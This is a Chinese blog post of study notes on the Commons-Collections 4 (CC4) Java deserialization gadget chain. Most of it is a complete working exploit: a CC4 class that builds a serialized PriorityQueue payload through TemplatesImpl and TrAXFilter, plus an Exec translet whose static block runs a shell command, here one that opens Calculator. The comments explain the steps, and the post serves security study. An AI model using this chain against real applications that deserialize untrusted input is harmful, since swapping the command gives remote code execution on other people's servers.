---
title: CC4
date: 2026-02-06 15:44:08
updated: 2026-02-09 19:46:20
tags:
  - Web
  - java
  - 反序列化
  - CC链
---
| **Gadget Chain** | **CC 版本依赖** | **JDK 版本限制** | **核心入口点 (Source)** | **核心特征/用途** |
| --- | --- | --- | --- | --- |
| **CC4** | 4.0 | **无限制** | `PriorityQueue` | **CC2 + CC3 的结合体**。CC 4.0 下的 Bypass 方案。 |

Commons-Collections 4.x

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770497494907-defe4a70-efc1-4c19-bda8-5fc7818decf2.png)

# EXP

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        String path = "/Users/bigcolaxd/IdeaProjects/java_study/CC/target/classes/Exec.class";
        byte[] code = Files.readAllBytes(Paths.get(path));
        byte[][] codes ={code};

        Class c = templates.getClass();
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field name = c.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "test");

        //Field tfactory = c.getDeclaredField("_tfactory");
        //tfactory.setAccessible(true);
        //tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers=new  Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //TransformingComparator transformingComparator = new TransformingComparator((Transformer) chainedTransformer);
        ////transformingComparator.compare("1","2");
        //PriorityQueue priorityQueue = new PriorityQueue<>(2, transformingComparator);
        //
        //Class<? extends PriorityQueue> priorityQueueclazz = priorityQueue.getClass();
        //Field size = priorityQueueclazz.getDeclaredField("size");
        //size.setAccessible(true);
        //size.set(priorityQueue,2);

        //因为add也会触发利用链所以先ConstantTransformer,若直接复制chainedTransformer，则在没有复制_tfactory时，代码执行时经过add触发利用链过程中会提前抛出异常无法到达serialize(priorityQueue);
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        //queue为transient无法序列化，writeObject记录了size而非queue，而size正常情况下通过add/offer函数来赋值
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(1);//offer也可以
        priorityQueue.add(2);//offer也可以

        Class clazz = transformingComparator.getClass();
        Field transformingField = clazz.getDeclaredField("transformer");
        transformingField.setAccessible(true);
        transformingField.set(transformingComparator, chainedTransformer);

        serialize(priorityQueue);
        unserialize("bin.ser");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos =  new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois =  new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}
```
```java
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Exec extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770495148665-0d8f66e5-2ae9-4492-b6b5-0da97d73dee9.png)